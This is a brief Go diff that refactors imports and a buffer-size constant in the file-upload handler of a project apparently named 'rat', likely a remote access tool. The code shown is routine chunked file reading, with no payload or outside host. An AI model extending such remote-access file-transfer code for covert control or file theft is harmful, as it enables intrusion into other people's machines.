@@ -4,8 +4,8 @@ import (
 	"fmt"
 	"io"
 	"os"
-
-	"rat/client/network/header"
+	"rat/shared"
+	"rat/shared/network/header"
 
 	"gopkg.in/mgo.v2/bson"
 )
@@ -43,7 +43,7 @@ func (packet UploadPacket) OnReceive() error {
 		}
 
 		for !final {
-			data := make([]byte, TransferPacketSize)
+			data := make([]byte, shared.TransferPacketSize)
 
 			read, err := local.Read(data)
 			if err == io.EOF {
